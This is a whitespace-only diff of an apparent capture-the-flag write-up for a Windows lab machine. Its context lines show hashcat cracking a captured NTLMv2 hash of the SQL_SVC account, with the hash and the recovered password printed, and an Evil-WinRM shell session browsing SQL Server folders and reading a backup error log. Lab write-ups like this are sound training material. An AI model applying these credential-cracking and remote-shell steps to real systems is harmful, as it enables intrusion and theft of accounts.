@@ -272,10 +272,13 @@ Now we can attempt to crack the obtained NTLMv2 hash:
   <SNIP>
 
   Dictionary cache hit:
+
   * Filename..: /usr/share/wordlists/rockyou.txt
   * Passwords.: 14344385
   * Bytes.....: 139921507
   * Keyspace..: 14344385
+
+<!-- -->
 
   SQL_SVC::sequel:5a468d462566c8f2:969ac4350349119aff80e5f157947705:010100000000000000f49497cb3cda0171c9c617170c770a0000000002000800550036003900430001001e00570049004e002d004b00460044005400350054004b0031004c004200420004003400570049004e002d004b00460044005400350054004b0031004c00420042002e0055003600390043002e004c004f00430041004c000300140055003600390043002e004c004f00430041004c000500140055003600390043002e004c004f00430041004c000700080000f49497cb3cda010600040002000000080030003000000000000000000000000030000053d56bd90cec18b19dacd970f3d395da99593d1d611efcdeedc06434b9d0792a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0036000000000000000000:REGGIE1234ronnie
 
@@ -422,7 +425,6 @@ It seems that we did not get much information from using `certify` as it found n
   d-r---         2/1/2023   1:55 PM                Users
   d-----         2/6/2023   7:21 AM                Windows
 
-
   *Evil-WinRM* PS C:\> cd SQLServer
   *Evil-WinRM* PS C:\SQLServer> ls
 
@@ -435,7 +437,6 @@ It seems that we did not get much information from using `certify` as it found n
   -a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
   -a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
 
-
   *Evil-WinRM* PS C:\SQLServer> cd Logs
   *Evil-WinRM* PS C:\SQLServer\Logs> ls
 
@@ -444,7 +445,6 @@ It seems that we did not get much information from using `certify` as it found n
   Mode                LastWriteTime         Length Name
   ----                -------------         ------ ----
   -a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
-
 
   *Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK
   2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
